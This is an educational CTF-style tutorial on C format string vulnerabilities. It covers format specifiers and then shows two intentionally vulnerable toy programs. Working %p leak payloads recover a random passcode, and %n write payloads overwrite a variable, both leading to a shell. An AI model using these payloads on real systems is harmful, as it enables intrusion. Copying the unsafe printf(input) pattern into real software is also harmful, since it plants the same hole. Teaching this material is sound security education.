<h1 align="center">PWN 202</h1>
  <p align="center">
  Format String Vulnerabilities
  </p>

### Table of contents

- [Introduction](#introduction)
- [Format Specifiers](#format-specifiers)
- [Leaking Memory](#leaking-memory)
- [Modifying Variables](#modifying-variables)
- [More Resources](#more-resources)
- [Creators](#creators)

## Introduction

Format string vulnerabilities are a class of vulnerabilities that affect functions which accept format specifiers as parameters, such as `printf()`, `fprintf()`, `sprintf()`, etc. Format string vulnerabilities can allow an attacker to leak memory from the stack, which can help the attacker learn information about the program. They can also be used to achieve the ability to write data to pointers located on the stack.

## Format Specifiers

A format specifier is something that is used in the `printf()` family of functions. The format specifier will typically tell the computer that it needs to print out extra parameters from the stack. For example, if a programmer made a call to `printf("%d", 50)`, then the value 50 would get pushed onto the stack, and when the `printf()` function sees the `%d` specifier, it will pop 50 from the stack and print it out as a string.

Here a list of common format specifiers that are used in C:
- `%n` - Interprets the next value on the stack as an `int *` and stores the number of characters that have been printed out to that variable.
- `%s` - Interprets the next value on the stack as a `char *` and prints it out.
- `%f` - Interprets the next value on the stack as a `float`, converts it to a `char *`, and prints it out.
- `%d` - Interprets the next value on the stack as an `int`, converts it to a `char *`, and prints it out.
- `%p` - Interprets the next value on the stack as a `void *`, converts it to a `char *`, and prints it out in hexadecimal.
- `%x` - Interprets the next value on the stack as an `int`, converts it to a `char *`, and prints it out in hexadecimal.

Here are some examples of how format specifiers can be used.
```sh
$ cat format_example.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    int i = 0;
    long l = 20;
    float f = .40;

    printf("The value of i is %d.\n", i);
    printf("The value of l is %ld.\n", l);
    printf("The value of f is %f.\n", f);
    printf("The value of i in hex is %x.\n", i);
    printf("The address of f is %p.\n", &f);
    printf("Changing the value of i to the number of characters printed out.\n%n", &i);
    printf("The new value of i is %d, which is also the number of characters in the line above.\n", i);

    return 0;
}

$ gcc format_example.c -o format_example

$ ./format_example
The value of i is 0.
The value of l is 20.
The value of f is 0.400000.
The value of i in hex is 0.
The address of f is 0x7fffffffe000.
Changing the value of i to the number of characters printed out.
The new value of i is 65, which is also the number of characters in the line above.
```

One neat trick that you can do with format specifiers is that you can reference the exact value that you would like to use from the stack by using a `$` character. For example, calling `printf("%4$d", 1, 2, 3, 4)` will print out `4` instead of `1`.

```sh
$ cat format_example2.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    printf("%3$d, %d", 1, 2, 3, 4, 5);
    return 0;
}

$ gcc format_example2.c -o format_example2

$ ./format_example2
3, 1
```

Click [here](https://www.tutorialspoint.com/format-specifiers-in-c) if you would like to see some more examples of how format specifiers can be used in C. Make sure that you understand how format specifiers work before you move on.

## Leaking Memory

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#define CODESIZE 50
#define BUFSIZE 300

void generate_code(char code[CODESIZE]) {
    int i = 0;
    const char alpha[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

    srand(time(NULL));
    for(i = 0; i < CODESIZE-1; i++) {
        code[i] = alpha[rand() % strlen(alpha)];
    }
}

int main(int argc, char **argv) {
    char input[BUFSIZE] = {0};
    char code[CODESIZE] = {0};

    generate_code(code);

    printf("Enter a string: ");
    fgets(input, BUFSIZE, stdin);
    printf(input);

    printf("Enter the passcode: ");
    fgets(input, BUFSIZE, stdin);
    if(strncmp(code, input, CODESIZE - 1) == 0) {
        system("/bin/sh");
    } else {
        printf("Incorrect. The correct passcode was %s.\n", code);
    }

    return 0;
}
```

In the code shown above, we have a function called `generate_code()` that randomly generates a passcode with a length of `CODESIZE`. In the `main()` function, we see that the user is prompted to enter a string and a passcode. If the passcode that the user types in is equivalent to the passcode that was randomly generated from the call to `generate_code()`, then the user will get a shell. The passcode is generated at runtime and changes every time the program is executed, so we can't just use the `strings` command to print it out.

```sh
$ gcc -o mem_leak mem_leak.c

$ ./mem_leak
Enter a string: hello
hello
Enter the passcode: idk
Incorrect. The correct passcode was E6UZdbLnODrjJD1lcb77ZKCzchHd92JBydaR3l2FmhotkdSA2.
```

One thing that should stick out to you is the line that says `printf(input)`. This is considered to be an insecure method of printing out C strings because if the user types in a format specifier, then the program will actually try to interpret that format specifier. For example, if the user types in "%d" as input, then the line will get reinterpreted as `printf("%d")`, which will cause the next value on the stack to be printed out as an `int`. In situations where we cannot attach debuggers (such as when we're exploiting remote targets), we can use this vulnerability to print out the values that are on the stack.

Note: The vulnerability would have been mitigated if the line was written as `printf("%s", input)`. The `printf()` function will ignore any format specifiers inside of `input` if it is passed through as a string using the "%s" format specifier.

The `code` variable is currently being stored on the stack, so why don't we just try printing it out using the format string vulnerability? We can send the target a bunch of "%p" format specifiers and separate them by periods. This will cause data on the stack to get printed out in hexadecimal format. We can then view the actual passcode and compare it with what we found on the stack.

```sh
$ ./mem_leak
Enter a string: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x55e7ea1856b1.(nil).0x55e7ea1856de.0x7ffe3103ec90.0x7fc1cb69fbe0.0x7ffe3103eeb8.0x100000000.0x535057476d636630.0x5765597550545371.0x766447786c795434.0x324b654261473234.0x6d54723644656d37.0x3545554273326d39.0x6c.(nil).
Enter the passcode: incorrectpasscode
Incorrect. The correct passcode was 0fcmGWPSqSTPuYeW4TylxGdv42GaBeK27meD6rTm9m2sBUE5l.
```

The hexadecimal equivalent of "0fcmGWPSqSTPuYeW4TylxGdv42GaBeK27meD6rTm9m2sBUE5l" in ASCII is `0x30 0x66 0x63 0x6d 0x47 0x57 0x50 0x53 0x71 0x53 0x54 0x50 0x75 0x59 0x65 0x57 0x34 0x54 0x79 0x6c 0x78 0x47 0x64 0x76 0x34 0x32 0x47 0x61 0x42 0x65 0x4b 0x32 0x37 0x6d 0x65 0x44 0x36 0x72 0x54 0x6d 0x39 0x6d 0x32 0x73 0x42 0x55 0x45 0x35 0x6c`. In the output, we can see that the eighth value printed off from the stack is `0x535057476d636630`, which is the first eight bytes of the passcode written backwards. The ninth value printed out, `0x5765597550545371`, contains the next eight bytes of the passcode written backwards, and each value that contains another eight bytes of the passcode written backwards (except for the last value, which only contains one byte of the passcode).

```sh
$ ./mem_leak
Enter a string: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x557b66c656b1.(nil).0x557b66c656de.0x7ffe234e6680.0x7f7c53430be0.0x7ffe234e68a8.0x100000000.0x447937784d595146.0x705275464a733667.0x3954534d516f4852.0x6e49596a6e774370.0x37616c625a78656f.0x494f57316c464969.0x63.(nil).
Enter the passcode:
```

Let's go through an example of how we would figure out the passcode if we did not know it beforehand. The first thing that we'll have to do is send fifteen "%p" format specifiers in order to print out 15 values from the stack (about 120 bytes). Then we would have to start at the eighth value, convert the bytes into their ASCII equivalents, and switch the order of the bytes. Here is the step-by-step process of doing this for the bytes that are shown above:

```sh
0x447937784d595146 -> Dy7xMYQF -> FQYMx7yD
0x705275464a733667 -> pRuFJs6g -> g6sJFuRp
0x3954534d516f4852 -> 9TSMQoHR -> RHoQMST9
0x6e49596a6e774370 -> nIYjnwCp -> pCwnjYIn
0x37616c625a78656f -> 7albZxeo -> oexZbla7
0x494f57316c464969 -> IOW1lFIi -> iIFl1WOI
0x0000000000000063 -> c        -> c
```

Putting this together gives us the string `FQYMx7yDg6sJFuRpRHoQMST9pCwnjYInoexZbla7iIFl1WOIc`. Using this string as the passcode will pop open a shell.

```sh
$ ./mem_leak
Enter a string: %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
0x557b66c656b1.(nil).0x557b66c656de.0x7ffe234e6680.0x7f7c53430be0.0x7ffe234e68a8.0x100000000.0x447937784d595146.0x705275464a733667.0x3954534d516f4852.0x6e49596a6e774370.0x37616c625a78656f.0x494f57316c464969.0x63.(nil).
Enter the passcode: FQYMx7yDg6sJFuRpRHoQMST9pCwnjYInoexZbla7iIFl1WOIc
$ ls
format_example2.c  format_example.c  mem_leak  mem_leak.c  README.md
$ echo "Format Strings Rock!"
Format Strings Rock!
$
```

## Modifying Variables

Format string vulnerabilities can be used for more than just leaking data. They can also be used to modify data as well. If a pointer is located on the stack, then you can use the "%n" format specifier to dereference that pointer and write data to it. The following code snippet contains such a situation.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFLEN 500

void print_money(int *money) {
    char name[BUFLEN];

    printf("Enter your name: ");
    fgets(name, BUFLEN, stdin);
    name[strlen(name) - 1] = '\0';

    printf(name);
    printf(", your wallet is at %p.\nYou currently have $%d.\n", money, *money);
}

int main(int argc, char **argv) {
    int money = 10;
    print_money(&money);
    if(money <= 10) {
        printf("You are poor.\n");
    } else {
        printf("You\'re swimming in cash!\n");
        system("/bin/sh");
    }
    return 0;
}
```

In this program, we have an integer called `money`, which is set to 10 by default. The `main()` function calls `print_money(&money)`, which will print out the value of `money`. Afterwards, if `money` is greater than 10, then we get a shell. Note that the `print_money()` function contains a format string vulnerability because it directly prints out the `name` buffer instead of safely using the "%s" format specifier. 

```sh
$ gcc -o cash cash.c

$ ./cash
Enter your name: Nihaal
Nihaal, your wallet is at 0x7fffffffe02c.
You currently have $10.
You are poor.
```

The program prints out the address of `money` when it is executed. Let's see if we can find this address on the stack by using a bunch of "%p" format specifiers.

```sh
$ ./cash
Enter your name: %p.%p.%p.%p.%p.%p.%p.%p.
0x5555555596b1.0x7fffffffde10.0x10.0x7fffffffde10.0x7ffff7fadbe0.(nil).0x7fffffffe03c.0x70252e70252e7025., your wallet is at 0x7fffffffe03c.
You currently have $10.
You are poor.
```

Notice how the seventh value on the stack is equal to the address of `money`. If we replace the seventh "%p" format specifier with a "%n" format specifier, we get the following output.

```sh
$ ./cash
Enter your name: %p.%p.%p.%p.%p.%p.%n.%p.
0x5555555596b1.0x7fffffffde10.0x10.0x7fffffffde10.0x7ffff7fadbe0.(nil)..0x70252e70252e7025., your wallet is at 0x7fffffffe03c.
You currently have $71.
You're swimming in cash!
$ ls
cash  cash.c  format_example2.c  format_example.c  mem_leak.c  README.md
$ echo "format strings r great!"
format strings r great!
$
```

Notice how the value of `money` changed from 10 to 71. This is because when the "%n" format specifier was used, we had printed 71 characters to the screen. We can have some amount of control over the `money` variable by changing the number of characters printed out to the screen.

```sh
$ ./cash
Enter your name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%p.%p.%p.%p.%p.%p.%n.%p.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0x5555555596b1.0x7fffffffde10.0x10.0x7fffffffde10.0x7ffff7fadbe0.(nil)..0x4141414141414141., your wallet is at 0x7fffffffe03c.
You currently have $110.
You're swimming in cash!
$
```

(In case you're wondering, the `name` buffer is also stored on the stack. Since this buffer starts with a bunch of A's in this example, `0x4141414141414141` is getting printed out.)

We can have a more fine-tuned way of controlling the number of printed characters by inserting a number between the "%" character and the "p" character. This number, which was originally created for alignment purposes, can allow us to completely control the output length. For example, typing in "%1000p" will ensure that exactly 1000 characters get printed out (most of which are spaces).

```sh
 ./cash
Enter your name: %1000p
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              0x30303031, your wallet is at 0x7fffffffe03c.
You currently have $10.
You are poor.
```

It looks kind of ugly, but then again, exploit development can be an ugly process ¯\\\_(ツ)_/¯

```sh
$ ./cash
Enter your name: %p.%p.%p.%p.%p.%1000p.%n.%p
0x5555555596b1.0x7fffffffde10.0x10.0x7fffffffde10.0x7ffff7fadbe0.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   (nil)..0x70252e70252e7025, your wallet is at 0x7fffffffe03c.
You currently have $1066.
You're swimming in cash!
$
```

## More Resources:
- [Format Specifiers in C](https://www.tutorialspoint.com/format-specifiers-in-c)
- [Exploiting Format String Vulnerabilities](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)

## Creators

**Nihaal Prasad**

Enjoy :metal:
